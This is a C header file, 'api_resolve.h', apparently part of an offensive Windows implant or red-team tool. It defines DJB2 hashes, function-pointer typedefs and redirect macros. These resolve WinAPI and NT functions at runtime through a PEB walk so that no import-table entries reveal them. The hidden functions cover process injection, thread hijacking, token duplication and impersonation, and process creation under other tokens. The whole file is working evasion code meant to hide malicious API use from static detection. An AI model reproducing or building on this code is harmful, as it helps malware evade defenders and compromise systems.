#ifndef API_RESOLVE_H
#define API_RESOLVE_H

/*
 * api_resolve.h — Phase 3 API hashing
 *
 * Resolves sensitive WinAPI functions at runtime via DJB2 hash + PEB walk
 * so they produce no import-table entries.
 *
 * Include order requirement:
 *   1. #include <windows.h>   (and <tlhelp32.h> if needed)
 *   2. #include "api_resolve.h"   ← macros shadow WinAPI names from here on
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdint.h>

/* =========================================================================
 * Hash constants — DJB2 of lowercase module name / exact function name
 * ========================================================================= */

/* Module hashes (djb2 of lowercase dll name) */
#define H_KERNEL32      0x3E003875u
#define H_NTDLL         0xE91AAD51u
#define H_ADVAPI32      0x03C6B585u
#define H_KERNELBASE    0x0A8817E1u

/* Function hashes (djb2 of exact export name, case-sensitive) */
#define H_VirtualAllocEx                0x87E8ADD4u
#define H_VirtualProtectEx              0xBB9D9FD2u
#define H_VirtualProtect                0x17EA484Fu
#define H_WriteProcessMemory            0xCF9E4312u
#define H_CreateRemoteThread            0x14B67BABu
#define H_OpenProcess                   0x89ECAB1Au
#define H_OpenThread                    0xD63D8CFFu
#define H_QueueUserAPC                  0x420F4AB7u
#define H_CreateToolhelp32Snapshot      0x66A720A5u
#define H_Thread32First                 0x1687A330u
#define H_Thread32Next                  0x3EB9F90Du
#define H_Process32First                0x8E650D75u
#define H_Process32Next                 0xDD82C128u
#define H_OpenProcessToken              0xB6BD4A01u
#define H_DuplicateTokenEx              0x821C3AB4u
#define H_ImpersonateLoggedOnUser       0xFD5E8956u
#define H_RevertToSelf                  0x032B9800u
#define H_AdjustTokenPrivileges         0xBFBBDF4Fu
#define H_LookupPrivilegeValueA         0x4798A192u
#define H_LogonUserW                    0x2A62FC26u
#define H_GetCurrentProcess             0x8E5B39D1u
#define H_GetCurrentProcessId           0x9210EADCu
#define H_GetCurrentThreadId            0xBF1A7CD9u
#define H_CloseHandle                   0x687C0D79u
#define H_HeapAlloc                     0x8B14C054u
#define H_HeapFree                      0x70D6CF8Du
#define H_GetProcessHeap                0x58B3A5E4u
#define H_InitializeProcThreadAttributeList 0x801D9A33u
#define H_UpdateProcThreadAttribute     0xA7D71C88u
#define H_DeleteProcThreadAttributeList 0xA0047FA2u
#define H_CreateProcessW                0x5768C91Du
#define H_CreateProcessAsUserW          0x4FD32F5Eu
#define H_CreateProcessWithTokenW       0x0DEADAA4u
#define H_CreateProcessWithLogonW       0xD70E39BAu
#define H_ResumeThread                  0xE88EC572u
#define H_GetThreadContext              0xC76B4E42u
#define H_SetThreadContext              0xA917D6D6u
#define H_GetModuleHandleW              0x4AB16D94u
#define H_VirtualAlloc                  0x19FBBF49u
#define H_VirtualFree                   0x0888E730u
#define H_CreateThread                  0xB67ACBEFu
#define H_GetProcAddress                0xAADFAB0Bu
#define H_LoadLibraryA                  0x01ED9ADDu
#define H_LoadLibraryW                  0x01ED9ACBu
#define H_GetModuleHandleA              0x4AB16D82u

/* =========================================================================
 * Function-pointer typedefs
 * ========================================================================= */

typedef LPVOID (WINAPI *FP_VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI *FP_VirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL   (WINAPI *FP_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL   (WINAPI *FP_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE (WINAPI *FP_CreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T,
                                               LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef HANDLE (WINAPI *FP_OpenProcess)(DWORD, BOOL, DWORD);
typedef HANDLE (WINAPI *FP_OpenThread)(DWORD, BOOL, DWORD);
typedef DWORD  (WINAPI *FP_QueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR);
typedef HANDLE (WINAPI *FP_CreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL   (WINAPI *FP_Thread32First)(HANDLE, LPTHREADENTRY32);
typedef BOOL   (WINAPI *FP_Thread32Next)(HANDLE, LPTHREADENTRY32);
typedef BOOL   (WINAPI *FP_Process32First)(HANDLE, LPPROCESSENTRY32);
typedef BOOL   (WINAPI *FP_Process32Next)(HANDLE, LPPROCESSENTRY32);
typedef BOOL   (WINAPI *FP_OpenProcessToken)(HANDLE, DWORD, PHANDLE);
typedef BOOL   (WINAPI *FP_DuplicateTokenEx)(HANDLE, DWORD, LPSECURITY_ATTRIBUTES,
                                             SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
typedef BOOL   (WINAPI *FP_ImpersonateLoggedOnUser)(HANDLE);
typedef BOOL   (WINAPI *FP_RevertToSelf)(void);
typedef BOOL   (WINAPI *FP_AdjustTokenPrivileges)(HANDLE, BOOL, PTOKEN_PRIVILEGES,
                                                  DWORD, PTOKEN_PRIVILEGES, PDWORD);
typedef BOOL   (WINAPI *FP_LookupPrivilegeValueA)(LPCSTR, LPCSTR, PLUID);
typedef BOOL   (WINAPI *FP_LogonUserW)(LPCWSTR, LPCWSTR, LPCWSTR, DWORD, DWORD, PHANDLE);
typedef HANDLE (WINAPI *FP_GetCurrentProcess)(void);
typedef DWORD  (WINAPI *FP_GetCurrentProcessId)(void);
typedef DWORD  (WINAPI *FP_GetCurrentThreadId)(void);
typedef BOOL   (WINAPI *FP_CloseHandle)(HANDLE);
typedef LPVOID (WINAPI *FP_HeapAlloc)(HANDLE, DWORD, SIZE_T);
typedef BOOL   (WINAPI *FP_HeapFree)(HANDLE, DWORD, LPVOID);
typedef HANDLE (WINAPI *FP_GetProcessHeap)(void);
typedef BOOL   (WINAPI *FP_InitializeProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST,
                                                              DWORD, DWORD, PSIZE_T);
typedef BOOL   (WINAPI *FP_UpdateProcThreadAttribute)(LPPROC_THREAD_ATTRIBUTE_LIST,
                                                      DWORD, DWORD_PTR, PVOID,
                                                      SIZE_T, PVOID, PSIZE_T);
typedef VOID   (WINAPI *FP_DeleteProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST);
typedef BOOL   (WINAPI *FP_CreateProcessW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES,
                                           LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID,
                                           LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
typedef BOOL   (WINAPI *FP_CreateProcessAsUserW)(HANDLE, LPCWSTR, LPWSTR,
                                                 LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
                                                 BOOL, DWORD, LPVOID, LPCWSTR,
                                                 LPSTARTUPINFOW, LPPROCESS_INFORMATION);
typedef BOOL   (WINAPI *FP_CreateProcessWithTokenW)(HANDLE, DWORD, LPCWSTR, LPWSTR,
                                                    DWORD, LPVOID, LPCWSTR,
                                                    LPSTARTUPINFOW, LPPROCESS_INFORMATION);
typedef BOOL   (WINAPI *FP_CreateProcessWithLogonW)(LPCWSTR, LPCWSTR, LPCWSTR, DWORD,
                                                    LPCWSTR, LPWSTR, DWORD, LPVOID,
                                                    LPCWSTR, LPSTARTUPINFOW,
                                                    LPPROCESS_INFORMATION);
typedef DWORD  (WINAPI *FP_ResumeThread)(HANDLE);
typedef BOOL   (WINAPI *FP_GetThreadContext)(HANDLE, LPCONTEXT);
typedef BOOL   (WINAPI *FP_SetThreadContext)(HANDLE, const CONTEXT*);
typedef HMODULE (WINAPI *FP_GetModuleHandleW)(LPCWSTR);
typedef LPVOID  (WINAPI *FP_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *FP_VirtualFree)(LPVOID, SIZE_T, DWORD);
typedef HANDLE  (WINAPI *FP_CreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T,
                                          LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef FARPROC (WINAPI *FP_GetProcAddress)(HMODULE, LPCSTR);
typedef HMODULE (WINAPI *FP_LoadLibraryA)(LPCSTR);
typedef HMODULE (WINAPI *FP_LoadLibraryW)(LPCWSTR);
typedef HMODULE (WINAPI *FP_GetModuleHandleA)(LPCSTR);

/* =========================================================================
 * Extern declarations of resolved function pointers (_r_ prefix)
 * ========================================================================= */

extern FP_VirtualAllocEx                _r_VirtualAllocEx;
extern FP_VirtualProtectEx              _r_VirtualProtectEx;
extern FP_VirtualProtect                _r_VirtualProtect;
extern FP_WriteProcessMemory            _r_WriteProcessMemory;
extern FP_CreateRemoteThread            _r_CreateRemoteThread;
extern FP_OpenProcess                   _r_OpenProcess;
extern FP_OpenThread                    _r_OpenThread;
extern FP_QueueUserAPC                  _r_QueueUserAPC;
extern FP_CreateToolhelp32Snapshot      _r_CreateToolhelp32Snapshot;
extern FP_Thread32First                 _r_Thread32First;
extern FP_Thread32Next                  _r_Thread32Next;
extern FP_Process32First                _r_Process32First;
extern FP_Process32Next                 _r_Process32Next;
extern FP_OpenProcessToken              _r_OpenProcessToken;
extern FP_DuplicateTokenEx              _r_DuplicateTokenEx;
extern FP_ImpersonateLoggedOnUser       _r_ImpersonateLoggedOnUser;
extern FP_RevertToSelf                  _r_RevertToSelf;
extern FP_AdjustTokenPrivileges         _r_AdjustTokenPrivileges;
extern FP_LookupPrivilegeValueA         _r_LookupPrivilegeValueA;
extern FP_LogonUserW                    _r_LogonUserW;
extern FP_GetCurrentProcess             _r_GetCurrentProcess;
extern FP_GetCurrentProcessId           _r_GetCurrentProcessId;
extern FP_GetCurrentThreadId            _r_GetCurrentThreadId;
extern FP_CloseHandle                   _r_CloseHandle;
extern FP_HeapAlloc                     _r_HeapAlloc;
extern FP_HeapFree                      _r_HeapFree;
extern FP_GetProcessHeap                _r_GetProcessHeap;
extern FP_InitializeProcThreadAttributeList _r_InitializeProcThreadAttributeList;
extern FP_UpdateProcThreadAttribute     _r_UpdateProcThreadAttribute;
extern FP_DeleteProcThreadAttributeList _r_DeleteProcThreadAttributeList;
extern FP_CreateProcessW                _r_CreateProcessW;
extern FP_CreateProcessAsUserW          _r_CreateProcessAsUserW;
extern FP_CreateProcessWithTokenW       _r_CreateProcessWithTokenW;
extern FP_CreateProcessWithLogonW       _r_CreateProcessWithLogonW;
extern FP_ResumeThread                  _r_ResumeThread;
extern FP_GetThreadContext              _r_GetThreadContext;
extern FP_SetThreadContext              _r_SetThreadContext;
extern FP_GetModuleHandleW              _r_GetModuleHandleW;
extern FP_VirtualAlloc                  _r_VirtualAlloc;
extern FP_VirtualFree                   _r_VirtualFree;
extern FP_CreateThread                  _r_CreateThread;
extern FP_GetProcAddress                _r_GetProcAddress;
extern FP_LoadLibraryA                  _r_LoadLibraryA;
extern FP_LoadLibraryW                  _r_LoadLibraryW;
extern FP_GetModuleHandleA              _r_GetModuleHandleA;

/* =========================================================================
 * Initializer — call once at startup before any WinAPI use
 * ========================================================================= */

void api_init(void);

/* Generic resolver — walks PEB module list and finds fn_hash in any loaded DLL.
 * Use for NT functions and any other API not covered by the redirect macros. */
void *resolve_fn(uint32_t fn_hash);

/* NT function hashes for use with resolve_fn() */
#define H_NT_NtOpenProcess            0xAED3CBA0u
#define H_NT_NtAllocateVirtualMemory  0xF0146CE2u
#define H_NT_NtWriteVirtualMemory     0x411B83A2u
#define H_NT_NtCreateThreadEx         0xBB485288u
#define H_NT_NtProtectVirtualMemory   0xCD363694u
#define H_NT_NtReadVirtualMemory      0xE88BED2Du
#define H_NT_NtQueueApcThread         0x4D230412u
#define H_NT_NtCreateSection          0x01D8A572u
#define H_NT_NtMapViewOfSection       0xDA22F84Eu
#define H_NT_NtUnmapViewOfSection     0x7473FDF5u
#define H_NT_NtSuspendThread          0xE03939BBu
#define H_NT_NtResumeThread           0xDAE08088u
#define H_NT_NtGetContextThread       0xBFC8B678u
#define H_NT_NtSetContextThread       0xD8FDE5ECu
#define H_NT_NtOpenFile               0xF43A35ADu
#define H_NT_NtClose                  0xF866D229u
#define H_NT_NtQueryInformationProcess 0x8BE68952u
#define H_NT_RtlGetVersion            0x30571EA3u

/* =========================================================================
 * Redirect macros — MUST appear after all WinAPI #includes
 *
 * Each call site in the including .c file is rewritten by the preprocessor
 * to call through the global function pointer.  The linker sees no direct
 * reference to the __imp_ symbol, so no IAT entry is generated.
 * ========================================================================= */

#undef VirtualAllocEx
#define VirtualAllocEx                  _r_VirtualAllocEx
#undef VirtualProtectEx
#define VirtualProtectEx                _r_VirtualProtectEx
#undef VirtualProtect
#define VirtualProtect                  _r_VirtualProtect
#undef WriteProcessMemory
#define WriteProcessMemory              _r_WriteProcessMemory
#undef CreateRemoteThread
#define CreateRemoteThread              _r_CreateRemoteThread
#undef OpenProcess
#define OpenProcess                     _r_OpenProcess
#undef OpenThread
#define OpenThread                      _r_OpenThread
#undef QueueUserAPC
#define QueueUserAPC                    _r_QueueUserAPC
#undef CreateToolhelp32Snapshot
#define CreateToolhelp32Snapshot        _r_CreateToolhelp32Snapshot
#undef Thread32First
#define Thread32First                   _r_Thread32First
#undef Thread32Next
#define Thread32Next                    _r_Thread32Next
#undef Process32First
#define Process32First                  _r_Process32First
#undef Process32Next
#define Process32Next                   _r_Process32Next
#undef OpenProcessToken
#define OpenProcessToken                _r_OpenProcessToken
#undef DuplicateTokenEx
#define DuplicateTokenEx                _r_DuplicateTokenEx
#undef ImpersonateLoggedOnUser
#define ImpersonateLoggedOnUser         _r_ImpersonateLoggedOnUser
#undef RevertToSelf
#define RevertToSelf                    _r_RevertToSelf
#undef AdjustTokenPrivileges
#define AdjustTokenPrivileges           _r_AdjustTokenPrivileges
#undef LookupPrivilegeValueA
#define LookupPrivilegeValueA           _r_LookupPrivilegeValueA
#undef LogonUserW
#define LogonUserW                      _r_LogonUserW
#undef GetCurrentProcess
#define GetCurrentProcess               _r_GetCurrentProcess
#undef GetCurrentProcessId
#define GetCurrentProcessId             _r_GetCurrentProcessId
#undef GetCurrentThreadId
#define GetCurrentThreadId              _r_GetCurrentThreadId
#undef CloseHandle
#define CloseHandle                     _r_CloseHandle
#undef HeapAlloc
#define HeapAlloc                       _r_HeapAlloc
#undef HeapFree
#define HeapFree                        _r_HeapFree
#undef GetProcessHeap
#define GetProcessHeap                  _r_GetProcessHeap
#undef InitializeProcThreadAttributeList
#define InitializeProcThreadAttributeList _r_InitializeProcThreadAttributeList
#undef UpdateProcThreadAttribute
#define UpdateProcThreadAttribute       _r_UpdateProcThreadAttribute
#undef DeleteProcThreadAttributeList
#define DeleteProcThreadAttributeList   _r_DeleteProcThreadAttributeList
#undef CreateProcessW
#define CreateProcessW                  _r_CreateProcessW
#undef CreateProcessAsUserW
#define CreateProcessAsUserW            _r_CreateProcessAsUserW
#undef CreateProcessWithTokenW
#define CreateProcessWithTokenW         _r_CreateProcessWithTokenW
#undef CreateProcessWithLogonW
#define CreateProcessWithLogonW         _r_CreateProcessWithLogonW
#undef ResumeThread
#define ResumeThread                    _r_ResumeThread
#undef GetThreadContext
#define GetThreadContext                _r_GetThreadContext
#undef SetThreadContext
#define SetThreadContext                _r_SetThreadContext
#undef GetModuleHandleW
#define GetModuleHandleW                _r_GetModuleHandleW
#undef VirtualAlloc
#define VirtualAlloc                    _r_VirtualAlloc
#undef VirtualFree
#define VirtualFree                     _r_VirtualFree
#undef CreateThread
#define CreateThread                    _r_CreateThread
#undef GetProcAddress
#define GetProcAddress                  _r_GetProcAddress
#undef LoadLibraryA
#define LoadLibraryA                    _r_LoadLibraryA
#undef LoadLibraryW
#define LoadLibraryW                    _r_LoadLibraryW
#undef GetModuleHandleA
#define GetModuleHandleA                _r_GetModuleHandleA

#endif /* API_RESOLVE_H */
